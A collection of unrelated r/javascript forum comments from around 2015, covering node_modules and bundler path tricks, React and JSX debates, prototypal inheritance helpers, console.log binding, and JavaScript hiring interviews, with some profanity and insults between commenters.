Any plans to add support for gutters?
"use stricter"; lol
Yes it is still relevant. Techniques and patterns might change a bit moving into ES5 and especially ES6, but that doesn't make old patterns irrelevant. Things like objects/closures/loops/functions/variables aren't changing much, if at all even up through ES6.
Please don't do this - node_modules is for npm to manage. Many workflows and deployments depend on being able to blow away node_modules at a moment's notice. As mentioned by others, there are plenty of workarounds to not needing `../../../` (the basedir is IMHO the most obvious and portable). Slightly more patronizing, but: Don't let your projects get out of hand. Have a solid plan on where files should go, and refactor often to keep the structure clean and obvious.
That's the route you're going to need to go then. Just iframe it in. Have fun!
You should look at ES-6/7 yes it'll be awhile before browsers support it but node will probably support it sooner. They fix some of your issues. I found it very hard to understand some of your article. 
I'd also make your gulp handle multilevel folders of files in source. People like to put stuff in folders.
gotcha
Added. Since the box-sizing is border-box the only thing that is required for gutters to work is a right padding.
I do a lot of interviews for hiring js devs. For me personally I want to see that you are capable of working through problems and self learning. A few key points: * Being able to google well (you laugh, but finding answers and applying them can be surprisingly difficult, especially in the js world.) * You're ability to self learn and apply new concepts learned immediately within a project. Javascript changes almost on a daily basis, self learning/direction is essential to me when hiring a javascript dev. * One of the most revealing questions I can ask about a subject, especially if someone says they are an expert in something is: "What don't you like about this?" If a so called expert in AngularJS/backbone/node/etc says there is nothing they don't like about it, then they likely don't know as much as they think. ;) When I give a technical interview I typically keep it simple, I don't want to see the most efficient sorting algorithm, but if i do a sorting type question, I want to see it worked through without the person getting frustrated and rage quitting. If I'm hiring for something like angular/backbone/ember/etc I'll usually just pair program on something simple, like a todo app, or bookstore or something. In the end, the self learning aspect and being able to keep up with rapid changes in the javascript world are my absolute top priority. So far, I've been completely happy with everyone I've been a part of hiring, and yes there have been a few with no CS degree or much experience. Knowing algorithms up front for javascript is largely meaningless, I rarely ever have to apply any algorithms in javascript (well, unless you're interviewing for a game dev/simulations type job using javascript) and when I do, I just look them up and am off running.
Didn't even know CJS require used to have that, which shows how much I know about CJS (not much). But never fear, soon ES~~6~~2015 will arrive to solve [all our problems](http://www.2ality.com/2014/09/es6-modules-final.html). (Except, as far as I can tell, no module registration which means relative paths for everybody)
I've ran into a similar issue, with key input in general. An alternative to using key events might be to use a change event on the input. In my case I'm already using an in browser code editor called: codemirror - http://codemirror.net/ Besides being fantastic as a general text/code editor you get all sorts of other functionality including events such as change. It handles foreign keyboard input as well, since it doesn't depend on key events for any of the input. TLDR; find a way/lib to use change events on your input/textarea to count when characters are added/removed and count that as key strokes. This way combo keys from all keyboards won't throw off the count.
But remember that if you're doing a normal web app then the JavaScript execution time will rarely be a bottleneck. That, instead, will most often be the DOM or the network.
I would advise against this. I have known way to many devs that when there is an issue with npm the first resort is blow out node_modules directory. Which is not a terrible, just not the most elegant. Nice write up though.
You're lucky... I've been in interviews where it was two hours before lunch, and two hours after lunch. And you get to have lunch with them... so you still have to be on spot. After five hours you leave wondering what the hell just happened. 
Who cares as long as nobody forces this into my application code. I will opt out of "use stricter" just as I do "use strict"
Hi /u/ChrisToffee, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
Just leaving this here : http://webpack.github.io/docs/configuration.html#resolve-modulesdirectories resolve: { moduleDirectories: ['client', 'node_modules'] } Done.
I don't have code handy but there's tons of examples littered all over plunkr and similar sites showing exactly how to do this. In fact, just walk yourself through[ the official Angular example tutorial](https://docs.angularjs.org/tutorial/) and you'll be set.
Counter to what people say here [Substack (the creator of browserify) actually recommends putting your code in node_modules](http://stackoverflow.com/questions/22434494/browserify-basedir-option). However I agree with others here and prefer not to put it there. The big problem with 'basedir' is that it only works on **entry** files. Further require calls deep in the file tree structure will always be resolved relatively to the file currently being parsed. For most people this isn't a problem since they use gulp or grunt and bundle their entire project. However if you are like me and use browserify to automatically bundle separate JS files it is an issue. The best solution is to use the undocumented paths option. [See this github debate for more.](https://github.com/substack/node-browserify/issues/767) 
with all due respect, wtf?
&gt; I just hope that they won't push it into Chrome I’m hoping this is more of a V8 thing because they want it for their own infrastructure within Google. They do have a massive investment in Java and C++ already, so it doesn’t surprise me that they would consider creating a Java-like dialect of JavaScript.
Using Bootstrap, jQuery (not 2.1.3) and a butt-load of plugins.
I'd love to see something that does dynamic sizing on internal elements so that each element is equal in width and height to the other elements and take up the maximum amount of space within the grid container. Where I can dynamically add elements and this is always the case with dynamic rearranging of elements. Wrapping required. If this all made sense.
[Look at those FPS](http://i.imgur.com/8AAmHLB.png). 
Looks like a satirical joke on JavaScript hipsters.
5 of the below 6 commenters are taking this way too seriously.
React is the "V" part in the MV* frameworks, so it really isn't a framework per se. Like others have said, it really depends upon what you're looking to do though.
Anyone who is forced to run a javascript-free browser will not be able to find and buy your products and services. Any search engine that does not interpret javascript will not be able to see your articles, products, or services, so you will not be found, and will not sell anything. (At this moment only Google interprets some javascript.) Anyone using a slower browser or a slower internet connection (think Smartphones, televisions, game stations), will have a hard time loading your pages adequately or at all, meaning they cannot find what you offer, meaning you score no sales. If your profit and outreach do not matter to you (for instance if you are an elitist billionaire), go right ahead.
fuck offffffffffffffffffff
Brilliant, bloody JS hipsters (please don't stop open sourcing I love you)
Resize() is to clear the canvas also
superClass.prototype.overrriddenFunctionName.apply(this, arguments);
I didn't read it, my instantaneous reaction to the word "artisanal" is "fuck offfffffffff"
That video looked a bit too zoomed so I had a look at the source ... seems like they're making fun of some other company but I don't get the reference http://www.artisanaljavascript.com/video/preview.mp4
The trouble with client side configuration such as browserify's `basedir` is that it tends to break serverside rendering. 
your friend is into javascript, but doesn't have a browser?
Nothing interesting. Problem with V8 isn't raw CPU-bound performance but unnecessary memory allocation. Moreover, browsers are limited by single threaded nature of JavaScript (and WebWorkers can have quite big overhead in performance-critical usages), very slow DOM manipulation and lack of widely supported and perfomant way to access power of GPU. 
He mentioned DOM in the question, very likely he will be interacting with CSS. Also, depends on the size of the company, I've had jobs where I was supposed to be just backend node, but then they end up asking you to help here or there and ended up even fixing wordpress issues.
javascript is prototypal inheritance. Can you do classical inheritance with it? sure... but that's not its strength, nor the way one should think about structuring their code. If you absolutely need classical inheritance you would create a constructor method, and inherit from that object's prototype. There's a lot of information about that... but if your friend doesn't "have reddit" i'm not sure they can google those results. Really, however, you should be looking into the strengths of protypes. The ability to easily add methods to an object's prototype is silly simple in prototypal languages and doesn't need to define something like an interface or any of that stuff. its more fluid, and more expressive. Albeit a different way of thinking. As one who came from classical to prototypal I can say its a learning curve, but its a good one to undertake.
 var result = [x, y] = 'pants'; //result = 'pants'; //x = 'p'; //y = 'a'; var result = [x, ...y] = 'pants'; //result = 'pants'; //x = 'p'; //y = ['a', 'n', 't', 's']; If you really wanted to support a true semantic for the implicit predicate in function arguments then you'd be getting in to function overloading, which is totally not going to happen in JS. function foo([x, y]) {} function foo([x, ...xs]) {} These two functions would overload the same symbol for different patterns, like having seperate left hands on the same function in haskell. foo :: [a] -&gt; a foo (x:xs) = x foo [x] = x 
you are leanring a new language, it's suppose to be tough! learning to program is like learning how to speak chinese, spanish, etc. You are learning how to think like a computer. My advice is to keep at it! Every day study at least for 15 minutes if you can't study at all. Write lots of code. Do lots of exercises. Enroll in coursea.org - sedgewicks algorithms I class. Do EDX - Mit 6.001 with python. 
My *jimmies*. Seriously, though. This is too short. I could scroll through this crap for hours.
I began open-sourcing some parts of my closed-source work, I hope this is of use for some people!
Thanks!
There's an old-but-good library from Dean Edwards back in 2006 that I still pull out occasionally: http://dean.edwards.name/weblog/2006/03/base/ Note that I don't use base2.js with all the extras- *just* base.js, *just* so that: * I don't have to retype proto / prototype * So the entire class is defined in a single block, without allowing arbitrary code between assignments to the prototype 
you can create the flipped canvas image before the game starts, and than just switch between them
You can use whatever you'd like for the M/C part. Backbone tends to perform better than say Angular, but a lot of people like Angular for the structure. And MVC is both front and backend, although usually if you're using MVC on the front end your likely using primarily a RESTful API for the backend. Facebook recently released Flux which is a new way of structuring large scale applications, where MVC can become very entangled.
Why do you say that? (Genuinely curious).
How well does this support responsive grids?
Not very interesting. Wake me up when they developed a completely new language which can compile to bytecode which can be executed on the browser and works with a virtual dom.
There are two t's in Elliott. Try https://ericelliottjs.com
Good point, I've updated it to more accurately reflect the intention of the guideline: &gt; For example, this could be a link to the project page (unminified/unobfuscated source code)
MDN has a few excellent articles on the subject: [Introduction to Object-Oriented JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Introduction_to_Object-Oriented_JavaScript) [Inheritance and the prototype chain](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain) [Inheritance revisited](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_Revisited)
An internval is definitely not the way to go. It's almost guaranteed to run too infrequently or too frequently, and which will depend on the workloads and hardware you're running on and probably a hundred other dynamic factors. What I would do in Node is do a recursive nextTick loop. Then, every turn of the event loop your callback will run. There you can check to see if a job is currently running, and if not, pull the next one out of the queue and run it. This is probably not the best way but could get you thinking :)
You probably are in the wrong subreddit, you'll get help on how to write Javascript here. Regardless, here are some pointers on your problem: - While it is doable in javascript(the downloading part may be a little complex though), you may be better off using another language like Python as it would be far simpler, you could run it without a browser and perform further PDF manipulation if wanted (Cant exactly modify the filesystem from a browser). It would be very easy in Python to accept a string or read a file, then save files from web pages. -Rate limits. Google may not like you to scrape such documents, though adding a delay may help. 
I'm sorry, but jQuery is extremely overkill for this.
John Resig, the "father" of jQuery wrote a post about this a while back. He also has the source code for a Class object that will allow you to implement all the functionality you referenced. Here's the link: http://ejohn.org/blog/simple-javascript-inheritance/
I took this approach, and while I am *supremely* unqualified to judge its efficacy, it "seems to work OK™"
jQuery massively simplifies event handling in older browsers. While I wouldn't use it myself in this scenario, you must remember that this code is being given to a newbie who shouldn't need to worry about feature detection and fallbacks.
The opposition might be trying to prevent feature bloat since this does make java script a more complicated language. The complaint I've read about C++ is that it's almost like multiple language and everyone only uses a subset. Might be better to just have a completely different language. 
You really shouldn't be using innerHTML anyways, there are security risks associated with it.
You can use [bower](http://bower.io/) to manage most dependencies, and if you are already using [grunt](http://gruntjs.com/) to build, concat or minify, there's a [grunt-bower-task module](https://github.com/yatskevich/grunt-bower-task) so you can just add a task and forget about it.
We will need to agree to disagree on that one.
a friend of a friend ;) 
source?
Yep, but why in FireFox it blocks events stream when i set code like this? &lt;option value='1'&gt;1&lt;/option&gt; &lt;option value='2'&gt;2&lt;/option&gt;
Problem can be realted with any HTML error on page or only with HTML error in parent node?
of course, it's a matter of taste. Personally, the thing I don't like about managing web dependencies with npm is that you can have 10 libraries that depend on jquery, and each one of them will hold its own jquery package. I like bower being flat.
Because our JS engineers are required to be proficient with DOM manipulation. Is that a serious question?
&gt; I'd like an async Array.sort() method too Does "async" mean something different than I think it does? Say I have a large user base, like 500 or more, trying to access my three Mongo shards all at once. Even with Mongo set to eventual-consistency and not worrying about confirming the writes, it's possible that during peak usage hours we could break the 200ms user-response threshold on larger sorts (say, like, you needed to parse a CSV with 1000+ lines). Is there a reason why Node doesn't have this yet?
You can't call a DOM element's constructor (Image, in this case) as a function. The call method is trying to invoke the Image function with the context of 'this' which is your Background function. It's a bad idea to subclass DOM elements. It's a bad idea to use inheritance in this way, anyway, regardless of the language you're using. Instead, use composition. Let your Background class have an 'image' property and use it that way. function Background() { this.image = new Image(); } Background.prototype.setSrc = function(src) { this.image.src = src; }; var bg = new Background(); bg.setSrc('http://example.com/some_image.jpg'); In my experience, it's always better to avoid inheritance. 
Look again at the post -- the node_modules at the root of the project is not touched at all -- there's a special `node_modules` somewhere else in the directory.... blowing away ./node_modules is still totally valid. This takes advantage of how `require` searches for the module -- it goes up the tree from current directory until it finds a `node_modules` and checks for the module there, repeat until necessary then throw module not found.
Resizing the canvas to clear the pixels isn't the best way to clear the canvas. It's better to clear the canvas with clearRect() as its performance is more consistent in more browsers. 
This is only really a bandaid solution but for stuff that didn't use a package manager before, Webpack can use external dependencies and sort of mock them into commonJS modules as explained [here](http://stackoverflow.com/questions/22530254/webpack-and-external-libraries) and [here](http://webpack.github.io/docs/library-and-externals.html).
...for packages.
The most elegant way is to **NOT** do OO. What's the actual problem you are writing the program to solve? I'll bet you a million dollars, there is a more elegant, more maintainable, and faster solution than whatever OO approach you're taking.
SoundScript requires ES6, but doesn't necessarily introduce any proprietary syntax. It seals classes that would be mutable otherwise, but without introducing new syntax. Obviously, the `+types` variant does introduce syntax that other browsers don't yet understand.
You can just use the slider change event for this. http://api.jqueryui.com/slider/#event-change
San Fran or Houston.
Late reply, but last time I checked Traceur wouldn't even preserve original comments. Would basically have to find something else to do our API docs that would work with jsdoc style comments and ES6. With 6to5 the comments are preserved, and we can run jsduck on the es5 generated code.
HTML5 Games, WebGL-based applications, working with big amounts of data, etc. If you were to right a BananaBread like the one Mozilla "compiled" from C++/C, it wouldn't be playable, because asm.js uses these optimizations and a lot more to make fast-executing code.
Writing a non WebGL tile engine in canvas requires as many speed tricks as you can find. I love articles like this and enjoy reading em.
Ah, 'pants' was a bad example. I was wondering about the return value of a failed destruct. How about `var result = [x, y] = [];`? My guess is x and y will be undefined while result will be []. 
Hi /u/mgenev, it looks like you're new to /r/javascript, welcome! Thanks for the submissions, but please make sure you read our [guidelines](http://www.reddit.com/r/javascript/wiki/index). In short, you should post from a variety of sources, and not just `100percentjs.com`. Thanks for your consideration! domain submitted from|count|% :-|-:|-: [100percentjs.com](/search?q=%28and+site%3A%27100percentjs.com%27+author%3A%27mgenev%27+is_self%3A0+%29&amp;restrict_sr=off&amp;sort=new)|15|100%
Renamed it to flux-libs: https://github.com/Janiczek/flux-libs
A bunch of Java "geniuses" decided they need to show these lousy scripters how it should be done... Would be fun to watch if they didn't have the mass of that brand behind them.
oh god. i'm scared to use polymer now just *because* it came from Google. After what they did to angular 2.x I'm re-considering my position on Google. They seem to have an agenda to kill javascript.
yeah, that's pretty crazy. I was disappointed when they abandoned RSS. Its still a good way to syndicate. Google reader was the only thing I went to Google for.
&gt; [1,2,3].map( console.log ).reduce( add ); What's the supposed to do, anyways? Did you mean this? function add(a, b) { return a + b; } function identity(a) { return a; } [1, 2, 3].map(identity).reduce(add, 0) //=&gt; 6 Is this a better wishlist example? [' foo ', ' bar '].map(String.trim) Yeah, it's no Clojurescript. Guess you can almost make your first example work: [1,2,3].forEach(console.log) //=&gt; 1 0 [1,2,3] // 2 1 [1,2,3] // 3 2 [1,2,3] Also, your first example works.
`[1,2,3].forEach( console.log.bind(console) );`
I meant it should log the arguments and pass them on. It should behave similar to this: function betterLog(){ console.log.apply( console, arguments ); return arguments[0]; }
Well, to be fair, even in functional languages like Haskell and Clojure, you want to differentiate between `map` (producing a sequence using a pure function) and `forEach` (doing something stateful like printing to stdout for each element in a sequence). `console.log` having no return value is pretty consistent with other languages.
To be fair: A phrase that often precedes a statement that is intended to offer a piece of information which the speaker feels is important to the conversation. This phrase often sounds pretentious when used, and will often be followed by a piece of obvious information that nobody wants to hear.
[Proto.js](https://github.com/rauschma/proto-js) is a library whose core is about 20 lines. Code: // Superclass var Person = Proto.extend({ constructor: function (name) { this.name = name; }, describe: function() { return "Person called "+this.name; } }); // Subclass var Employee = Person.extend({ constructor: function (name, title) { Employee.super.constructor.call(this, name); this.title = title; }, describe: function () { return Employee.super.describe.call(this)+" ("+this.title+")"; } }); Interaction: var jane = Employee.new("Jane", "CTO"); // normally: new Employee(...) &gt; Employee.isPrototypeOf(jane) // normally: jane instanceof Employee true &gt; jane.describe() 'Person called Jane (CTO)' 
Yeah, right...
To be fair, it's actually a device that's most commonly used to take the edge off of the statement that follows in an effort to give it a more modest interpretation: to avoid the focus on disagreement while offering a potentially contrary point.
One of the reasons I wrote my post is that I am so sick of typing `console.log.bind(console)` every time I need to pass a logger to some function I getting familiar with or testing.
[That's not good enough](https://www.youtube.com/watch?v=JImcvtJzIK8), you say? You seem to be confused. Yes, in most environments the console methods are actual methods, so you can't just pass the actual functions and expect them to be invoked as methods. It's not `this` that's the problem. *It's just you*. Anyway. ES6 has you covered: makeAjaxRequest() .then( x =&gt; console.log(x), e =&gt; console.error(e) ) .then( doSomething ); I'm sorry, but you're being incoherent and whatever sense you are making appears entirely idiotic. Please go now.
**No.** My point remains: using "methods" instead of functions is why we can't have nice things.
another rookie's marketing plan foiled.
Nail.js? --- all be here all night
honestly, if they start asking a bunch of irrelevant algorithmic questions, I would just bail.
its a bad idea. it complicates everything. and google can't crawl shit.
Yes, you're an idiot. We've established that. You rage about how the language is broken because `this` is not defined if you call a function in a way that does not assign a value to `this`. And then you go on to make pointless examples of that. Yet at no point you explain why you think this is a problem. Please come back with an argument, then we can have a discussion. Right now you're just making a mess.
JavaScript is broken. It was broken from the start. We all know that. But it is not my point or my complaint. My point is that broken features should not be added or encouraged in the language to the point where they become the norm. `console.log` is not a feature of JavaScript. It is an illustration I provide of what happens when you _have_ to use OO things in the language where a context-independent function would work much better. There are JavaScript platforms where `console.log`/`print` is context-independent. So it is not a language problem. In other words: _please write your functions without `this` by default. They work better that way._
And here's a nice article on it's perspective http://moduscreate.com/react-native-react-js-goes-mobile/
This proposal isn't something which Google just made up by themselves from scratch. * Sealing objects and classes is something which you can already do in JS using the Object.seal() method. * Microsoft blazed the static-typing-on-js trail with their work on TypeScript. A new mode or two which enforces sealed objects and support type information directly, is a fairly logical extension of things which are already happening elsewhere in JS-land. 
For that you don't need a grid system but rather [flexbox](http://css-tricks.com/snippets/css/a-guide-to-flexbox/). It requires a fallback for older browsers but is very helpful for designs like you're describing.
The npm package [is barely ever downloaded](http://npm-stat.com/charts.html?package=flightjs) and it [doesn't even show up](http://bower.io/stats/) in the bower top 100. The [copyright notice in the README](https://github.com/flightjs/flight/blob/master/README.md) is still dated 2013. Going by those indicators, it seems there is no significant user base outside twitter. At least not on the scale of competing frameworks/libraries. Also, in comparison to Facebook's React and Google's AngularJS, Twitter doesn't seem to do much to promote Flight beyond a basic project one-page website and some markdown docs. Even [knockout seems to be doing better on npm](http://npm-stat.com/charts.html?package=knockout), and I'm fairly certain most knockout users (much like jquery) don't install it via npm. It's definitely not dead. There is active development on GitHub and issues are getting closed. It's just not very alive.
https://github.com/eugeneware/deglobalify
This looks good. I will try this. Thank you
Isomorphism = equal shape, as the HTML from the server is the same as that produced on the client
None. Sharing a dependency isn't a problem. Having multiple copies of the same library is what troubles me. If your project used d3, c3 and nvd3, and you used npm to manage those dependencies, you'd end up with three copies of d3. For complex projects that could mean that the node_modules folder has several nested node_modules in it, leading to slower deploy procedures and just bloat.
Your link doesn't work, there are no details of what this is, and the title of your post doesn't give any indication either.
&gt; bower is suboptimal Why so? The only "flaw" I can think of, is that some packages just have the minimized version of the library, but that's not bower's fault. 
It seems I'm going to spend the rest of february learning Webpack... **mind blown**
From the same blog, [a problem with constructs such as 'use stricter'; is that it makes developing new Javascript versions more difficult](http://www.2ality.com/2014/12/one-javascript.html#strict_mode_and_ecmascript_6). Which can be a trade-off you can choose to make, but I'm not sure whether it's really necessary. The advantage of e.g. 'use asm'; is that it doesn't change behaviour, so there is no need to take it into account with future Javascript versions.
Since they also switched to iojs, there is quite a bit of ES6 natively supported. And 6to5 supports blacklisting features that have native support (e.g. not touching generators if the target runtime has generator support). So not only is it possible to gracefully get rid of the conversions, it's possible to do it incrementally.
This too uses jquery but it has been perfect for my own barcode scanning needs. http://www.deadosaurus.com/detect-a-usb-barcode-scanner-with-javascript/
Myarray (myfirstnumber) returns the value at position myfirstnumber in the array. And not the value of myarray(0). 
Any initial impressions after comparing `syphon` and `mcfly`?
Read [this](https://github.com/stephenplusplus/sindredash/blob/master/index.js) and consider [this](https://github.com/stephenplusplus/sindredash/blob/master/package.json#L22) and then compare that to [this line](https://github.com/stephenplusplus/sindredash#other-ways-to-use). Or in short: has a bunch of dependencies and combines them all to one exported module.
That's a feature not a bug! Built in pomodoro timers, it's revolutionary really. After a half hour when it slows to a halt that's when you take a break. 
 Slowest Trees | Total ---|--- SixToFive | 606371ms I get terrible build times with it in Ember/Broccoli. 
What kind of sense does it make in the first place to use map to do something besides construct another array? Environment APIs should pollute the global scope with as few names as possible IMO, if you want log(), warn(), and error() you can define them yourself pretty easily in three lines. If anything, this ability to adapt to multiple programming styles versus forcing one on everyone is a point in favor of javascript, despite all its flaws. 
Isomorphic or as I prefer environment agnostic is this: var complexLogic = function(itemA, itemB){ return itemA.a * itemB.a / itemA.c * itemB.x + itemB.a * itemB.y; } Then on client side you will have a client specific code which is not isomorphic, is just client side: var itemA = prepareItemA(); var itemB = prepareItemB(); require('complexLogic')(itemA, itemB); On the server side: var itemA = Car.findById(1).wait(); var itemB = Car.findById(2).wait(); require('complexLogic')(itemA, itemB); Notice how you are reusing the exact same file and logic between client and server side. You might wonder why you want this: - Validation; - Client side prediction when possible; Instant feedback; - DRY, easier, quicker and less probable to have bugs; I've done big complex apps this way and is not easy, but on the long term is easier than just having in 2 different places or even languages the exact same thing. **You can even do more complex stuff:** var complexLogic = function(api, cb){ api.getItem(1).then(function(res){cb(res.err, res.data.x + res.data.y)}) } **Client side:** require('complexLogic')(clientSideApi, cb); What clientSideApi does: - Makes an ajax request; - Arrives to server; - Invokes the service; - Returns data; **Server side:** require('complexLogic')(serverSideApi, cb); What serverSideApidoes: - Invokes the service; - Returns data; Notice that the api doesn't behave the same on each end, but has the same interface.
it's my own content. It's against some policy to share it?
I'm only partially aware of React.js, but at least these points that you have here don't seem especially strong. &gt;HTML directly mixed in your JS Do you use JQuery? Because $("&lt;your html here&gt;") seems to be just as liable to mix the presentation layer in with logic and break separation of concerns. &gt;.JSX files You don't run *any* post-coding steps on your coded JS files? Not even minification?
1.) Turns out, "separation of concerns" isn't that great. See these talks by [Pete Hunt](http://youtu.be/x7cQ3mrcKaY) and [Tom Occhino](http://youtu.be/KVZ-P-ZI6W4) for Facebook's reasoning. Or, just Google "reactjs separation of concerns." It's been discussed ad nauseum. The gist being, the benefits of separation of concerns aren't as good as the benefits of developing in a component-based architecture (which is what react/jsx gives you). Side note: you don't have to use jsx. 2.) Compilation is a non-issue, IMHO. Chances are, in any project of size, there already a compilation step. My suggestion, give react a try over a weekend. I'd bet the benefits of components will ease the heartbreak of having to compile code and above you of the sin of not separating your concerns. 
When I send files to the server using jQuery I find it best to use FormData like you mentioned. var formData = new FormData($('#projectEditForm')[0])); // This form contains the &lt;file&gt; element. Make sure this has a name attribute, like "imageupload" $.ajax({ url: url, type: 'POST', data: formData, cache: false, contentType: false, processData: false }); I am not familiar with C#, but I assume it works just like any other language. You will receive the form data in some way with a key-value pair or something. Ex, in PHP: // When form POST detected $firstImageUploadPath = $_FILES['imageupload']['tmp_name'][0]; // And so on... Edit: Make sure there is no upload size restrictions taking place. Also, use the browser developer tools to inspect the HTTP request (Aka "Network" tab). Take a look and see if the form data is in the request and look if the Content-Length seems accurate.
I can't stand obscure selectors and mangled jQuery logic floating around - that's pretty much what conceived every modern UI framework. I'm comparing React to other UI frameworks, not stand-alone jQuery. I do use minification, but certainly not in development. 
Did you read the guidelines?
i did after you linked, thanks
Ok, then you should have read that it's not against the rules to share your own content. It is, however, against the rules to share _only_ your content.
So here is a short explanation from the about page http://2015.jsunconf.eu: &gt; Unconf means unconference. The JS Unconf is a non-profit unconference from the community for the community. There is no schedule or speaker list in advance. Everybody can apply with a talk. Everybody can vote for talks at the beginning of each day of the unconference. The talks which got the most votes from the attendees will be picked. The JS Unconf is organized by the BOOT e.V. and the FSR Informatik der Universität Hamburg. So I've been last year to the jsunconf and the talks were very good. If you have to choose between jsconf and jsunconf you should probably choose jsconf.eu over jsunconf.eu but jsconf.eu is also very expensive. Hope that helps!
conversely, what's not great about React.js: 1. constantly changing component/element API if you don't use JSX transforms (e.g. you don't want to use the whole npm + webpack/browserify/jsx-tools transform+bundle+bootstrap+compress workflow) 2. slow behavior when constantly recomputing object trees (you can solve this with diligence with data manipulation and shouldComponentUpdate OR use ImmutableJS or something) 3. awkward ass "class" definition with objects (improved/fixed in 0.13) 4. stupid mixins (largely removed in 0.13) 5. virtual DOM (it's really just an implementation detail, if browsers got their shit together, it could really just do a digest or anything) 6. first-class consumption still uses this horrible browser language (though, CLJS/Om is godlike, so there's that) 7. hyped up, but not as much money making opportunity as angular and ember (not as easy to integrate and just shit into your project -- the opposite is true also, easy to integrate react components into existing projects) 8. most people fucking suck at writing JS/programming in general, and letting them just write JS makes it hard to fix and enforce structure. not a problem if you're a small shop or you quality control your devs, but in a "big company"/average corpo shop, this will fuck you 9. stupid JSX/react style attribute names, because of camelCasing fashion freaks 10. PRs sit in GH for months before ever getting a response, makes you wonder when X bugfix you see on GH is ever going to get merged ...but overall still better than almost every other npm-listed/JS project, so it's really fucking good
Give the 6to5 project a look. It supports JSX syntax. A lot of people are incorporating 6to5 (+webpack) into their workflows since the combination brings so much to the table. Regardless of if you want to use React, getting access to the new ES6 standard is a pretty big win.
&gt; React proponents would tell you that forcing yourself to separate HTML and JS (presentation and logic) is more of a separation of technologies rather than concerns. I agree with this, and I actually like that concept. But when integrating a CSS library, I think it could be troublesome to have your logic exposed when you're only editing HTML. Like when Bootstrap was updated from 2.3.2 to 3, everything changed. It seems much more comforting/convenient to have files containing pure HTML to modify, especially if it's they're being modified by another developer/designer who doesn't write a lot of JS (referring to devs who write purely HTML and CSS.) With that said though, it is definitely possible that they could still break the component without seeing the JS.
I am in strong agreement when it comes to JSX, but React is popular because when it came out it was a truly _new_ idea about interacting with the DOM, something that no one else was trying and something demonstrably better. It is certainly not popular only because Facebook made it. 
7's an interesting point; though not really a React fan, I'd still be happier seeing React on job postings than I have been seeing Angular everywhere, and React isn't as much of an 'enterprise solution' so it might not get to that point. 
Tell that to all the designers I work with who don't know JS but who can style the hell out of HTML+CSS. I love it because I don't have to worry about the HTML/CSS at all - I hand off a basic html template file and they go to work while I make sure the platform JS code is solid (using angular). It's a real-world benefit that is erased with React having html inside the javascript. Programmers don't often do layout very well, and having to develop the React way is limiting who you can hire, and limits the scalability of a team. 
Yeah, integrating with CSS is different in react for sure, as far as something like bootstrap is concerned though it isnt too bad. Bootstrap's css is already separated into components. So you would create a react version of each of the bootstrap components (or just use react-bootstrap) and the rest of the app's higher level components would be composed of these bootstrap components. When updating bootstrap, your changes are just in your bootstrap related components. Its still an issue when you want to use someone elses generic component (that doesn't expose classnames on the inner elements) with something like bootstrap as far as I can tell.
Bit of a tangent, and someone let me know if this pedantry is meaningless, but: applications don't boot. Booting is for operating systems. Applications _initialize_, but 'boot' refers to bootstrapping, and that is something Javascript applications don't really do, regardless of whether they're 'isomorphic' or not. 
Not really sure what you're trying to say. I can't think of a single language whose main stdout functions return the argument you pass to it.
 &gt; HTML directly mixed in your JS mixes the &gt; presentation layer with your logic, breaking &gt; separation of concerns. But UI presentation and UI interaction **are** closely intertwined. Ever work on a project with `index.html` and then one big `app.js` of jQuery select/trigger soup? That's not separation of concerns. That's just indirection. Proof: Change index.html in a random way. You'll have to check app.js to see if it broke anything.
It's really not that much different from other templating languages. It has different syntax to learn and so forth. But I do agree it is a barrier to entry, and partly why i haven't used it at work yet.
I use this: function inherits(Child, Parent) { var hasProp = {}.hasOwnProperty; function T() { this.constructor = Child; this.constructor$ = Parent; for (var propertyName in Parent.prototype) { if (hasProp.call(Parent.prototype, propertyName) &amp;&amp; propertyName.charAt(propertyName.length-1) !== "$" ) { this[propertyName + "$"] = Parent.prototype[propertyName]; } } } T.prototype = Parent.prototype; Child.prototype = new T(); return Child.prototype; } Parent class: function Parent() { } Parent.prototype.method = function() { console.log("parent"); }; Child class (can have as deep as you like): function Child() { this.constructor$(); } inherits(Child, Parent); Child.prototype.method = function() { this.method$(); console.log("child"); }; This is specifically designed for performance - there is no faster way to do super method calls, after all, they're technically exactly like normal method calls. Demo http://jsfiddle.net/op8ozp20/ Btw, there is [class syntax in next ecmascript version](http://www.2ality.com/2012/07/esnext-classes.html) which desugars to the above code.
I'm with you most of the way but how is MVC a terrible idea for big apps? What is so terrible about it?
Strange that anyone would miss such an obvious point. Are lighter alternatives, such as backbone, looking into this approach?
And not to mention its hard to read. Whoever maintains it will probably burn your house down. 
Have you given it 5 minutes yet?
With my example you can add anything to the form. If you want more data you could just add hidden input elements or something for static stuff. Ex: // This is one way of adding data var somevalue = $("&lt;input type=\"hidden\" name=\"somevariable\" /&gt;").val("somevalue"); $('#projectEditForm').append(somevalue); // When sending this to the server; ALL elements in the form is in the request var formData = new FormData($('#projectEditForm')[0])); // Or you can add data in this way. May be better and nicer: formData.append("somevariable", "somevalue"); I don't think you can actually send form data with JSON as you have written in the message without doing some tricks in javascript (reading the file, base64 encode it, and include in json, then parse and decode on server) From jQuery documentation on **serialize()**: &gt; Data from file select elements is not serialized. **EDIT** Updated code example
React does fit in to the MVC pattern, it's designed to be the view and only the view. This is taken directly from the React homepage: "Lots of people use React as the V in MVC. Since React makes no assumptions about the rest of your technology stack, it's easy to try it out on a small feature in an existing project."
&gt; I think it could be troublesome to have your logic exposed when you're only editing HTML. That's true, but that inevitably happens even when you're using something like Angular directives or Ember Handlebars. Modern JavaScript-heavy web applications have inherent coupling between the description of DOM and the logic of the application, because the logic of the application *determines* the DOM (i.e. if your application JS is one big function, its output at any given time is the state of the DOM at that time). React realizes this and hits it head on: you literally use JavaScript (and JSX sugar if you prefer) to describe the DOM of your application.
